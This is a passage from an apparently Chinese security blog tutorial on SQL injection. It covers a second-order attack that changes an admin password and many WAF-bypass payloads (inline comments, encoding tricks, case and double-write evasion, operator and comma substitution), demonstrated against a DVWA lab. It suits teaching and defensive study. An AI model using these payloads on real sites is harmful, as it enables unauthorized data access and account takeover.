&lt;p&gt;现在我们注册一个账号，用户名叫：&lt;code&gt;admin&#39;#&lt;/code&gt;，假设这个网站管理员账号叫&lt;code&gt;admin&lt;/code&gt;，跟我们输入的名称很像吧&lt;/p&gt;
&lt;p&gt;经过注册程序的检查，这个名称没有任何问题，于是放进了数据库&lt;/p&gt;
&lt;p&gt;接下来，我们修改这个账号的密码为123，数据库自信地取出这个账号名称放在sql语句里&lt;/p&gt;
&lt;p&gt;这时，sql语句就变成了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;UPDATE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SET&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;password&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;new_password&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;username&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;#&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;因为#的注释，我们竟然直接修改了admin账号的密码！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;好啦，这下我们可以随意登录管理员的账号啦~&lt;/p&gt;
&lt;h1 id=&#34;绕过waf&#34;&gt;绕过WAF
&lt;/h1&gt;&lt;p&gt;为了防止sql注入，许多程序应用都会设置各种各样的过滤防护条件——Web应用防火墙(WAF)&lt;/p&gt;
&lt;p&gt;作为攻击者的我们，就需要想办法绕过这些条件，达到注入的目的&lt;/p&gt;
&lt;h2 id=&#34;1-空格过滤绕过&#34;&gt;#1 空格过滤绕过
&lt;/h2&gt;&lt;p&gt;众所周知，sql语句里面存在着大量的空格，而有些WAF会直接把空格加入黑名单，比如下面的代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$id_sanitized&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;str_replace&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,  &lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT user, password FROM users WHERE user_id = &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$id_sanitized&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;它会直接把用户输入内容中的空格移除，然后再拼接进去&lt;/p&gt;
&lt;p&gt;但是，空格有很多的绕过方式&lt;/p&gt;
&lt;h3 id=&#34;注释绕过&#34;&gt;注释绕过
&lt;/h3&gt;&lt;p&gt;在大多数的数据库（特别是mysql）中，&lt;strong&gt;注释&lt;code&gt;/**/&lt;/code&gt;能够代替空格&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39;/**/union/**/select/**/1,database()#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250628203003878.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250628203003878&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;可以看到，sql语句能够正常运行&lt;/p&gt;
&lt;h3 id=&#34;url编码绕过&#34;&gt;url编码绕过
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;一般来说，我们会使用&lt;code&gt;+&lt;/code&gt;代替空格，因为&lt;code&gt;+&lt;/code&gt;是空格的一种url标准编码形式，如果不行，就要另寻他法了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对于大多数数据库来说，它们在解析SQL语句时，会将多种空白字符都视为空格一样的分隔符，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;普通空格 (Space, &lt;code&gt;%20&lt;/code&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;制表符 (Tab, &lt;code&gt;%09&lt;/code&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;换行符 (Newline, &lt;code&gt;%0a&lt;/code&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;回车符 (Carriage Return, &lt;code&gt;%0d&lt;/code&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;虽然过滤了普通空格，但是其他的符号仍然可以起到空格相等的作用&lt;/p&gt;
&lt;p&gt;制表符等都是不可见字符，我们需要使用url编码来表示他们，比如：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39;%0dunion%0dselect%0d1,database()#
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;括号绕过&#34;&gt;括号绕过
&lt;/h3&gt;&lt;h4 id=&#34;数字型&#34;&gt;数字型
&lt;/h4&gt;&lt;p&gt;mysql数据库有这样一个特性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;在where id=1后加上=1，变成where id=1=1，意思是查询结果不变&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;在where id=1后加上=0，变成where id=1=0，意思是查询结果取反&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;结合substring()，我们就能构造出下面的不带有空格注入：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1=(ascii(substring(database(),1,1))=100)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;如果数据库名称第一个字符不是d，那么就会是1=0，和正常的输入1的结果是完全不同的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这个思想和盲注异曲同工，但是你可能也发现了，上面的payload只适用于数字型的注入&lt;/p&gt;
&lt;h4 id=&#34;字符型数字型&#34;&gt;字符型&amp;amp;数字型
&lt;/h4&gt;&lt;p&gt;mysql数据库还有一个特性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;mark&gt;&lt;strong&gt;任何可以计算出结果的语句，都可以用括号包围起来&lt;/strong&gt;&lt;/mark&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果我们想要在字符型进行空格的括号绕过，可以使用()把and后面的表达式包裹起来（前提是有返回值）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上文提到的&lt;code&gt;sleep()&lt;/code&gt;函数其实是有返回值的，执行成功为1，失败为0，因此可以使用()包裹：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39;and(sleep((ascii(substring(database(),1,1))=100)+4))#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;而if()函数的返回值则取决于我们写在if里面的函数：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39;and(if(length(database())=4,sleep(5),1))#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;效果和时间盲注相同，这种方式可以用在字符型，也可以用在数字型&lt;/p&gt;
&lt;p&gt;如果逗号被过滤，一般也要使用括号绕过：&lt;a class=&#34;link&#34; href=&#34;#%e7%bb%95%e8%bf%87%e5%87%bd%e6%95%b0%e5%8f%82%e6%95%b0%e4%b8%ad%e7%9a%84%e9%80%97%e5%8f%b7&#34; &gt;逗号绕过——绕过函数参数中的逗号
    
&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;2-内联注释绕过&#34;&gt;#2 内联注释绕过
&lt;/h2&gt;&lt;h3 id=&#34;绕过特定屏蔽词&#34;&gt;绕过特定屏蔽词
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;为了保持和其他数据库的兼容，mysql数据库会执行放在&lt;code&gt;/*!...*/&lt;/code&gt;里面的语句&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这样，如果WAF限制了不能使用一些查询语句，我们就可以把它放在&lt;code&gt;/*!...*/&lt;/code&gt;里，比如：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union/*!select*/ 1,2 #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;WAF会把它看成&amp;quot;带有奇怪符号的注释&amp;quot;而放行，但是到了mysql环境里，就能被执行：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250629194535907.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250629194535907&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我们还可以在&lt;code&gt;/*!...*/&lt;/code&gt;里面加上版本号：&lt;code&gt;/*!50001...*/&lt;/code&gt;，表示数据库是5.00.01及以上版本，该语句才会被执行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我使用的dvwa的mysql版本是5.5.53，如果使用&lt;code&gt;1&#39; union/*!60001select*/ 1,2 #&lt;/code&gt;，就会报版本错：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#39;1,2 #&amp;#39;&amp;#39; at line 1
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;干扰waf过滤&#34;&gt;干扰WAF过滤
&lt;/h3&gt;&lt;p&gt;有的WAF过滤覆盖的范围可能不够大，比如会过滤掉&lt;code&gt;order by&lt;/code&gt;，但是如果在中间加上&lt;code&gt;/*!10440*/&lt;/code&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; or 1=1 order/*!10440*/by 1#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样很可能就能让WAF识别错误，如果一个内联注释不行，就多来几个：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; or 1=1 order/*!77777cz*//*!77777cz*/by 1#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或者干脆使用普通的注释干扰：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; or 1=1 order/*%%!asd%%%%*/by 1#
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3-大小写绕过&#34;&gt;#3 大小写绕过
&lt;/h2&gt;&lt;p&gt;有的WAF只针对小写的（或者大写的）查询语句做了过滤：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;strpos&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;union&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#56b6c2&#34;&gt;!&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;mark&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;false&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;strpos&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;select&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#56b6c2&#34;&gt;!&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;mark&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;false&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM users WHERE user_id = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;然而很多sql数据库是不区分大小写的&lt;/strong&gt;，我们就可以大小写交错写来绕过：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; uNiOn sElEcT 1,database()#
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;4-双写绕过&#34;&gt;#4 双写绕过
&lt;/h2&gt;&lt;p&gt;部分WAF所做的工作只是简单的把不允许出现的查询内容（比如sql语句）替换成空字符串：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$id_sanitized&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;str_replace&lt;/span&gt;(&lt;span style=&#34;color:#c678dd&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;union&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;select&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;]; );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM users WHERE user_id = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$id_sanitized&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这种过滤方式是很不可靠的，因为就算有危险内容，&lt;strong&gt;简陋过滤之后剩下的部分仍然会进入查询（一次过滤）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们就可以通过&amp;quot;双写&amp;quot;，&lt;strong&gt;比如&lt;code&gt;selselectect&lt;/code&gt;，替换中间的&lt;code&gt;select&lt;/code&gt;为空后，剩下的部分仍然是&lt;code&gt;select&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; uniunionon selselectect 1,2#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;过滤器替换后：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,2#
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;5-编码绕过&#34;&gt;#5 编码绕过
&lt;/h2&gt;&lt;p&gt;如果WAF针对关键词进行了区分大小写的过滤，这时候就不能通过大小写和双写蒙混过关了&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;不过根据WAF一次过滤的特点，我们还是利用各种编码构造出payload&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;双重url编码绕过&#34;&gt;双重URL编码绕过
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;因为上传的payload只会url解析一次，我们把部分字符再次进行url编码：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union se%256cect 1,database()#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WAF部分(&lt;code&gt;%25&lt;/code&gt; -&amp;gt; &lt;code&gt;%&lt;/code&gt;)看见的内容是：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union se%6cect 1,database()#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行部分(&lt;code&gt;%6c&lt;/code&gt; -&amp;gt; &lt;code&gt;l&lt;/code&gt;)看见的是：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,database()#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这就成功传入了目标语句&lt;/p&gt;
&lt;p&gt;附上一张url编码表：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/194720-20200610165300516-237246127.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;URL编码表&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;十六进制unicode编码ascii编码绕过&#34;&gt;十六进制、Unicode编码、ASCII编码绕过
&lt;/h3&gt;&lt;p&gt;其实就是把过滤的字符转换成不同的编码欺骗WAF，比如十六进制：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1%ef%bc%87 or 1=1#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;部分WAF无法解析%ef%bc%87，放行之后会在执行sql语句的服务器(比如IIS)解析，是全角字符&lt;code&gt;＇&lt;/code&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1＇ OR 1=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当然你也能直接输入全角试试能不能绕过，这里只是举一个例子&lt;/p&gt;
&lt;p&gt;其他方式大同小异，这里不多赘述&lt;/p&gt;
&lt;h2 id=&#34;6-等价代替绕过&#34;&gt;#6 等价代替绕过
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;WAF限制了某一些的符号、语句或者函数，但我们可以设法找到功能一样或相似的来代替&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;逻辑符号过滤&#34;&gt;逻辑符号过滤
&lt;/h3&gt;&lt;h4 id=&#34;等号过滤绕过&#34;&gt;等号(=)过滤绕过
&lt;/h4&gt;&lt;p&gt;在SQL语句里，除了=，还有很多用于比较的运算符：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;like&lt;/code&gt;：用于匹配字符串，&lt;code&gt;A like B&lt;/code&gt;表示B是A&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;in&lt;/code&gt;：用于查找目标是否在对应组中&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;rlike&lt;/code&gt;：只要匹配字符串出现即可，&lt;code&gt;A rlike B&lt;/code&gt;表示B在A里面&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;regexp&lt;/code&gt;：和&lt;code&gt;rlike&lt;/code&gt;用法一样&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;between&lt;/code&gt;：&lt;code&gt;expr between 下界 and 上界&lt;/code&gt;，表示是否&lt;code&gt;expr &amp;gt;= 下界 &amp;amp;&amp;amp; exp &amp;lt;= 上界&lt;/code&gt;，上下界可以相等&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果WAF过滤了=，我们可以使用他们实现相同目的：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = &amp;#39;users&amp;#39;#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用&lt;code&gt;like&lt;/code&gt;匹配：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name like &amp;#39;users&amp;#39;#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用&lt;code&gt;in&lt;/code&gt;匹配（&lt;strong&gt;注意in匹配的对象要是一个组&lt;/strong&gt;）：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name in (&amp;#39;users&amp;#39;)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用&lt;code&gt;rlike&lt;/code&gt;/&lt;code&gt;regexp&lt;/code&gt;匹配：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name rlike &amp;#39;users&amp;#39;#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用between判断：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name between &amp;#39;users&amp;#39; and &amp;#39;users&amp;#39;#
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;大于号和小于号过滤绕过&#34;&gt;大于号(&amp;gt;)和小于号(&amp;lt;)过滤绕过
&lt;/h4&gt;&lt;p&gt;使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找&lt;/p&gt;
&lt;p&gt;如果无法使用比较操作符，那么就需要使用到greatest()和least()来进行绕过了&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;greatest(n1,n2,n3,&amp;hellip;)函数返回输入参数(n1,n2,n3,&amp;hellip;)的最大值，least()则是返回最小值：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and greatest(ascii(substr(database(),0,1)),64)=64
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;等价于：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and ascii(substr(database(),0,1))&amp;gt;64
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;and和or过滤绕过&#34;&gt;and和or过滤绕过
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;符号&lt;/th&gt;
          &lt;th&gt;等价符号&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;and&lt;/td&gt;
          &lt;td&gt;&amp;amp;&amp;amp;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;or&lt;/td&gt;
          &lt;td&gt;||&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;xor&lt;/td&gt;
          &lt;td&gt;|&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;not&lt;/td&gt;
          &lt;td&gt;!&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;注释符号过滤&#34;&gt;注释符号过滤
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;如果WAF过滤了&lt;code&gt;#&lt;/code&gt;和&lt;code&gt;-- &lt;/code&gt; ，我们可以使用另一个&lt;code&gt;&#39;&lt;/code&gt;闭合后面的&lt;code&gt;&#39;&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,2 or &amp;#39;1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或者&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,&amp;#39;2
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;逗号过滤&#34;&gt;逗号过滤
&lt;/h3&gt;&lt;h4 id=&#34;绕过limit中的逗号&#34;&gt;绕过limit中的逗号
&lt;/h4&gt;&lt;p&gt;在进行盲注时，我们经常需要逐行读取数据，会用到&lt;code&gt;limit m, n&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;可以使用limit m offset n代替，表示取m行，跳过n行：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,database() limit 1 offset 0 #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;等价于&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,database() limit 0,1 #
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;绕过函数参数中的逗号&#34;&gt;绕过函数参数中的逗号
&lt;/h4&gt;&lt;p&gt;很多函数需要多个参数，用逗号隔开，例如&lt;code&gt;substring(string, m, n)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;可以使用substring(stringfrom m for n)代替：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and substring(database()from 1 for 1)=&amp;#39;d&amp;#39; #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;如果空格被过滤了，可以使用()包裹from和for后面的数字：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and substring(database()from(1)for(1))=&amp;#39;d&amp;#39; #
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;绕过select列表中的逗号&#34;&gt;绕过select列表中的逗号
